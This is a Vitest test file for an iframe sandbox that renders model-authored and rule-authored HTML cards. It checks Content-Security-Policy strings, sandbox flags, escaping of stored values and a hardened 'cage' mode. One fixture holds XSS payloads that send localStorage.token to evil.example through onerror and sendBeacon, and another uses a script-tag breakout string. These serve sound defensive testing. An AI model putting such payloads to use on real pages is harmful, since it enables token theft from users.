/** @vitest-environment jsdom */
import { createHash } from 'node:crypto';
import { describe, expect, it, vi } from 'vitest';
import { CAGE_MESSAGE_SOURCE } from '../../../src/ui/lib/frame-cage';
import {
  BEAUTIFIER_FRAME_CSP,
  BEAUTIFIER_FRAME_SANDBOX,
  buildBeautifierFrameCsp,
  buildBeautifierFrameDocument,
  isBeautifierCageInnerReady,
  isBeautifierFrameMessage,
  recommendedFrameMinHeight,
  splitRichDocument,
} from '../../../src/ui/lib/beautifier-frame';

describe('beautifier iframe document', () => {
  it('keeps the frame shell transparent around a rule-owned color scheme', () => {
    const document = buildBeautifierFrameDocument({
      markup: '<div style="color-scheme: dark; background: #36393f">rule-owned card</div>',
      bridgeId: 'bridge-theme-boundary',
    });

    expect(document).not.toContain(':root { color-scheme: light dark; }');
    expect(document).toContain(
      'html, body { margin: 0; width: 100%; min-width: 0; background: transparent; }',
    );
    expect(document).toContain('style="color-scheme: dark; background: #36393f"');
    expect(document).not.toContain('data-beautifier-source-text');
  });

  it('retains fenced full-document rule CSS, markup, and scripts', () => {
    const parts = splitRichDocument(
      '```html\n<!doctype html><html><head><style>.card{color:red}</style></head>' +
        '<body><div class="card">legacy</div><script>window.ready=true</script></body></html>\n```',
    );

    expect(parts.head).toContain('.card{color:red}');
    expect(parts.body).toContain('<div class="card">legacy</div>');
    expect(parts.body).toContain('<script>window.ready=true</script>');
    expect(parts.htmlAttributes).toBe('');
    expect(parts.bodyAttributes).toBe('');
    expect(recommendedFrameMinHeight('<!doctype html><html></html>')).toBe(240);
    expect(recommendedFrameMinHeight('<span>inline</span>')).toBe(1);
  });

  it('allows remote resources in an opaque script sandbox without sanitizing markup', () => {
    const document = buildBeautifierFrameDocument({
      markup:
        '<button onclick="clicked()">open</button>' +
        '<script>fetch("https://example.com")</script>',
      bridgeId: 'bridge-1',
    });

    expect(BEAUTIFIER_FRAME_SANDBOX).toBe('allow-scripts');
    for (const blockedCapability of [
      'allow-same-origin',
      'allow-forms',
      'allow-popups',
      'allow-downloads',
      'allow-top-navigation',
    ]) {
      expect(BEAUTIFIER_FRAME_SANDBOX).not.toContain(blockedCapability);
    }
    expect(document).toContain('connect-src http: https: ws: wss: data: blob:');
    expect(document).toContain('default-src http: https: data: blob:');
    expect(document).toContain("frame-src 'none'");
    expect(document).toContain("form-action 'none'");
    const policy = document.match(/Content-Security-Policy" content="([^"]+)/)?.[1] ?? '';
    expect(policy).toContain('https:');
    expect(policy).toContain('unsafe-eval');
    expect(document).toContain('onclick="clicked()"');
    expect(document).toContain('<script>fetch("https://example.com")</script>');
  });

  it('denies model-authored markup any script, network, or shared-storage surface', () => {
    const document = buildBeautifierFrameDocument({
      markup:
        '<div class="st-card st-item_info" style="color:#fff">' +
        '<img src="x" onerror="fetch(\'https://evil.example/?d=\'+localStorage.token)">' +
        '<script>navigator.sendBeacon("https://evil.example", "leak")</script></div>',
      bridgeId: 'bridge-model-card',
      scripts: 'block',
      scriptNonce: 'nonce-under-test',
      // 就算调用方传了整份命名空间，模型帧也不许把它内嵌进 srcdoc。
      storageEntries: [['workshop-secret', 'do-not-embed']],
    });

    const policy = document.match(/Content-Security-Policy" content="([^"]+)/)?.[1] ?? '';
    // 拦截靠**浏览器**执行 CSP，不靠正则消毒 —— 所以 markup 本身必须原样保留。
    expect(document).toContain('onerror="fetch(');
    expect(document).toContain('<script>navigator.sendBeacon(');
    expect(document).toContain('style="color:#fff"');

    expect(policy).toContain("script-src 'nonce-nonce-under-test'");
    expect(policy).toContain("script-src-attr 'none'");
    expect(policy).toContain("connect-src 'none'");
    expect(policy).toContain("default-src 'none'");
    expect(policy).not.toContain('unsafe-eval');
    expect(policy).not.toContain("script-src 'unsafe-inline'");
    // 卡片自己的样式/图片/字体照旧，视觉不降级。
    expect(policy).toContain("style-src http: https: data: blob: 'unsafe-inline'");
    expect(policy).toContain('img-src http: https: data: blob:');

    // 宿主引导脚本带 nonce，才是唯一被放行的那一个。
    expect(document).toContain('<script nonce="nonce-under-test">');
    expect(document).not.toContain('do-not-embed');
    // 共享命名空间既不注入初值，也不挂 window.regexStorage 别名。
    expect(document).toContain('const __beautifierSharedStorage = false;');
  });

  it('keeps rule-authored frames on the shared, scriptable contract', () => {
    const document = buildBeautifierFrameDocument({
      markup: '<div>rule card</div>',
      bridgeId: 'bridge-rule-card',
      storageEntries: [['shared-key', 'shared-value']],
    });

    const policy = document.match(/Content-Security-Policy" content="([^"]+)/)?.[1] ?? '';
    expect(policy).toContain("script-src http: https: data: blob: 'unsafe-inline' 'unsafe-eval'");
    expect(policy).toContain('connect-src http: https: ws: wss: data: blob:');
    expect(document).toContain('shared-value');
    expect(document).toContain('const __beautifierSharedStorage = true;');
    // 规则帧不用 nonce，宿主脚本靠 'unsafe-inline' 放行。
    expect(document).not.toContain('<script nonce=');
  });

  it('accepts only bridge messages for the current frame', () => {
    expect(
      isBeautifierFrameMessage(
        { source: 'fated-poem-beautifier', bridgeId: 'a', type: 'height', height: 100 },
        'a',
      ),
    ).toBe(true);
    expect(
      isBeautifierFrameMessage(
        { source: 'fated-poem-beautifier', bridgeId: 'stale', type: 'height' },
        'a',
      ),
    ).toBe(false);
    expect(
      isBeautifierFrameMessage(
        {
          source: 'fated-poem-beautifier',
          bridgeId: 'a',
          type: 'storage-mutate',
          sequence: 1,
          mutations: [{ kind: 'set', key: 'theme', value: 'dark' }],
        },
        'a',
      ),
    ).toBe(true);
    expect(
      isBeautifierFrameMessage(
        {
          source: 'fated-poem-beautifier',
          bridgeId: 'a',
          type: 'storage-mutate',
          sequence: 1,
          mutations: [{ kind: 'set', key: 'theme' }],
        },
        'a',
      ),
    ).toBe(false);
  });

  it('hydrates the shared regex namespace before legacy head scripts run', () => {
    const document = buildBeautifierFrameDocument({
      markup:
        '<!doctype html><html><head><script>window.initialTheme=localStorage.getItem("theme")</script></head>' +
        '<body>body</body></html>',
      bridgeId: 'bridge-2',
      storageEntries: [['theme', 'dark']],
    });

    expect(document.indexOf('const __beautifierPersistentStorage')).toBeLessThan(
      document.indexOf('window.initialTheme=localStorage'),
    );
    expect(document).toContain('[["theme","dark"]]');
    expect(document).toContain("Object.defineProperty(window, 'regexStorage'");
    expect(document).toContain("post('storage-mutate'");
    expect(document).toContain('mutations.slice(offset, offset + __beautifierStorageBatchSize)');
    expect(document).toContain("data.type === 'storage-sync'");
    expect(document).toContain('Object.defineProperty(window, name');
    expect(document).toContain('window.TavernHelper = helper');
    expect(document).toContain('window.SillyTavern =');
    expect(document).not.toContain('window.fetch = blockedNetwork');
    expect(document).not.toContain('navigator.sendBeacon = () => false');
    expect(document).toContain('window.open = () => null');
    expect(document).toContain('fixedOverlayHeight');
    expect(document).toContain('new MutationObserver(scheduleMeasure)');

    const bootstrap = document.match(/<script>\n([\s\S]*?)<\/script>/)?.[1];
    expect(bootstrap).toBeTruthy();
    expect(() => new Function(bootstrap!)).not.toThrow();
  });

  it('escapes persisted values before embedding them in the bootstrap script', () => {
    const document = buildBeautifierFrameDocument({
      markup: '<p>safe body</p>',
      bridgeId: 'bridge-storage-escape',
      storageEntries: [['payload', '</script><script>window.escaped=false</script>']],
    });

    expect(document).not.toContain('</script><script>window.escaped=false</script>');
    expect(document).toContain('\\u003c/script>\\u003cscript>window.escaped=false\\u003c/script>');
    const bootstrap = document.match(/<script>\n([\s\S]*?)<\/script>/)?.[1];
    expect(() => new Function(bootstrap!)).not.toThrow();
  });

  it('executes and splits large ordered mutation bursts into valid bridge batches', async () => {
    const frameDocument = buildBeautifierFrameDocument({
      markup: '<p>runtime</p>',
      bridgeId: 'bridge-runtime',
    });
    const bootstrap = frameDocument.match(/<script>\n([\s\S]*?)<\/script>/)?.[1];
    expect(bootstrap).toBeTruthy();

    const iframe = document.createElement('iframe');
    document.body.append(iframe);
    const child = iframe.contentWindow! as Window & typeof globalThis;
    Object.defineProperties(child, {
      TextEncoder: { configurable: true, value: TextEncoder },
      ResizeObserver: {
        configurable: true,
        value: class {
          observe() {}
        },
      },
      requestAnimationFrame: { configurable: true, value: () => 1 },
    });
    const postMessage = vi.fn();
    Object.defineProperty(child, '__captureBeautifierMessage', {
      configurable: true,
      value: postMessage,
    });
    const runtimeBootstrap = bootstrap!.replace(
      "parent.postMessage({ source, bridgeId, type, ...detail }, '*');",
      'window.__captureBeautifierMessage({ source, bridgeId, type, ...detail });',
    );
    expect(runtimeBootstrap).not.toBe(bootstrap);

    try {
      const run = child.Function(
        `${runtimeBootstrap}\nfor (let i = 0; i < 1025; i++) localStorage.setItem('same', String(i));`,
      );
      run();
      await Promise.resolve();

      const batches = postMessage.mock.calls
        .map(([message]) => message as { type?: string; mutations?: unknown[] })
        .filter((message) => message.type === 'storage-mutate');
      expect(batches.map((message) => message.mutations?.length)).toEqual([1024, 1]);
    } finally {
      iframe.remove();
    }
  });

  it('preserves document attributes and content outside an embedded HTML fence', () => {
    const parts = splitRichDocument(
      '<StatusPlaceHolderImpl/>```html\n<!doctype html><html class="theme"><head></head>' +
        '<body class="viewer"><main>content</main></body></html>\n```',
    );

    expect(parts.htmlAttributes).toBe('class="theme"');
    expect(parts.bodyAttributes).toBe('class="viewer"');
    expect(parts.body).toContain('<StatusPlaceHolderImpl/>');
    expect(parts.body).toContain('<main>content</main>');
  });
});

// ── 加固档（插件系统设计 §4.4、§11 前两档） ──────────────────────────────

const sha256 = (value: string): string => createHash('sha256').update(value).digest('hex');

const FIXED_OPTIONS = {
  markup:
    '<!doctype html><html lang="en"><head><style>.c{color:red}</style></head>' +
    '<body class="b"><div class="c" onclick="x()">卡片</div><script>window.ok=1</script></body></html>',
  bridgeId: 'bridge-fixed',
  forwardContextMenu: true,
  storageEntries: [['k', 'v']] as [string, string][],
  scriptNonce: 'nonce-fixed',
};

function cspOf(document: string): string {
  return document.match(/Content-Security-Policy" content="([^"]+)/)?.[1] ?? '';
}

interface CageConfig {
  source: string;
  channel: string;
  innerMode: string;
  link: string;
  inner: string;
}

/** 取出牢笼文档脚本里的配置字面量（内层文档以 JSON 字符串形式嵌在里面）。 */
function cageConfig(document: string): CageConfig {
  const literal = document.match(/const config = (\{.*\});\n/)?.[1];
  if (!literal) throw new Error('不是牢笼文档');
  return JSON.parse(literal) as CageConfig;
}

function remoteSources(policy: string): string[] {
  return policy.split(/[\s;]+/).filter((token) => /^[a-z]+:$/.test(token));
}

describe('美化帧加固档', () => {
  it('不加固时两档文档与改动前逐字节一致', () => {
    // 哈希取自加固档落地前的实现输出（2026-11-15），非加固路径任何字节变化都会让它变红。
    expect(sha256(buildBeautifierFrameDocument({ ...FIXED_OPTIONS, scripts: 'allow' }))).toBe(
      'b1bfddee0d5891af3b42cc721cb783a74de5d272edf435c4a8a328ecc620f40b',
    );
    expect(sha256(buildBeautifierFrameDocument({ ...FIXED_OPTIONS, scripts: 'block' }))).toBe(
      '655d8778269983d13afbc9504c18854aa891311e71c499f72bb40f7f919012c7',
    );
    expect(
      buildBeautifierFrameDocument({ ...FIXED_OPTIONS, scripts: 'block', hardened: false }),
    ).toBe(buildBeautifierFrameDocument({ ...FIXED_OPTIONS, scripts: 'block' }));
  });

  it('不加固时策略串与改动前一致', () => {
    expect(BEAUTIFIER_FRAME_CSP).toBe(
      "default-src http: https: data: blob:; base-uri 'none'; object-src 'none'; " +
        "frame-src 'none'; child-src 'none'; form-action 'none'; manifest-src 'none'; " +
        "style-src http: https: data: blob: 'unsafe-inline'; img-src http: https: data: blob:; " +
        'font-src http: https: data: blob:; media-src http: https: data: blob:; ' +
        'connect-src http: https: ws: wss: data: blob:; worker-src blob:; ' +
        "script-src http: https: data: blob: 'unsafe-inline' 'unsafe-eval'; " +
        "script-src-attr 'unsafe-inline'",
    );
    expect(buildBeautifierFrameCsp('block', 'n1')).toBe(
      "default-src 'none'; base-uri 'none'; object-src 'none'; frame-src 'none'; " +
        "child-src 'none'; form-action 'none'; manifest-src 'none'; " +
        "style-src http: https: data: blob: 'unsafe-inline'; img-src http: https: data: blob:; " +
        'font-src http: https: data: blob:; media-src http: https: data: blob:; ' +
        "connect-src 'none'; worker-src 'none'; script-src 'nonce-n1'; script-src-attr 'none'",
    );
  });

  it.each(['allow', 'block'] as const)('%s 档加固后 CSP 没有 http: 与 ws: 来源', (scripts) => {
    const policy = buildBeautifierFrameCsp(scripts, 'n1', { hardened: true });
    const sources = remoteSources(policy);
    expect(sources).not.toContain('http:');
    expect(sources).not.toContain('ws:');
    expect(sources).toContain('https:');
    expect(policy).toContain('img-src https: data: blob:');
    if (scripts === 'allow') {
      expect(policy).toContain('connect-src https: wss: data: blob:');
      expect(policy).toContain("script-src https: data: blob: 'unsafe-inline' 'unsafe-eval'");
    } else {
      expect(policy).toContain("connect-src 'none'");
      expect(policy).toContain("script-src 'nonce-n1'");
    }
  });

  it.each(['allow', 'block'] as const)(
    '%s 档加固后输出 relay 牢笼文档，内层就是加固策略下的原文档',
    (scripts) => {
      const hardened = buildBeautifierFrameDocument({ ...FIXED_OPTIONS, scripts, hardened: true });
      const config = cageConfig(hardened);

      expect(config.source).toBe(CAGE_MESSAGE_SOURCE);
      expect(config.link).toBe('relay');
      expect(config.innerMode).toBe('srcdoc');
      expect(config.channel).toBe(FIXED_OPTIONS.bridgeId);

      // 内层 = 改动前的文档，只把 CSP 换成加固档；markup 与引导脚本逐字保留。
      const plain = buildBeautifierFrameDocument({ ...FIXED_OPTIONS, scripts });
      const hardenedPolicy = buildBeautifierFrameCsp(scripts, FIXED_OPTIONS.scriptNonce, {
        hardened: true,
      });
      expect(config.inner).toBe(plain.replace(cspOf(plain), hardenedPolicy));

      // 牢笼与内层同一份策略、同一个 nonce（模型帧 nonce-only，牢笼脚本也要靠它放行）。
      expect(cspOf(hardened)).toBe(hardenedPolicy);
      for (const document of [hardened, config.inner]) {
        const sources = remoteSources(cspOf(document));
        expect(sources).not.toContain('http:');
        expect(sources).not.toContain('ws:');
      }
      expect(hardened).toContain(`<script nonce="${FIXED_OPTIONS.scriptNonce}">`);
      // 美化 markup 只在 JSON 字面量里，不进牢笼文档的 HTML 解析器。
      expect(hardened).not.toContain('<div class="c" onclick="x()">');
    },
  );

  it('未指定 nonce 时每份加固文档各自生成，且牢笼与内层一致', () => {
    const options = { ...FIXED_OPTIONS, scriptNonce: undefined };
    const first = buildBeautifierFrameDocument({ ...options, scripts: 'block', hardened: true });
    const second = buildBeautifierFrameDocument({ ...options, scripts: 'block', hardened: true });
    const nonceOf = (document: string) =>
      document.match(/<script nonce="([^"]+)">/)?.[1] ?? 'missing';

    expect(nonceOf(first)).not.toBe('missing');
    expect(nonceOf(first)).not.toBe(nonceOf(second));
    expect(nonceOf(cageConfig(first).inner)).toBe(nonceOf(first));
    expect(cspOf(first)).toContain(`'nonce-${nonceOf(first)}'`);
  });

  it('只把本帧牢笼的 inner-ready 认作就绪信号', () => {
    const ready = { source: CAGE_MESSAGE_SOURCE, channel: 'a', type: 'inner-ready' };
    expect(isBeautifierCageInnerReady(ready, 'a')).toBe(true);
    expect(isBeautifierCageInnerReady(ready, 'b')).toBe(false);
    expect(isBeautifierCageInnerReady({ ...ready, type: 'cage-ready' }, 'a')).toBe(false);
    expect(isBeautifierCageInnerReady({ ...ready, source: 'other' }, 'a')).toBe(false);
    expect(isBeautifierCageInnerReady(null, 'a')).toBe(false);
  });
});
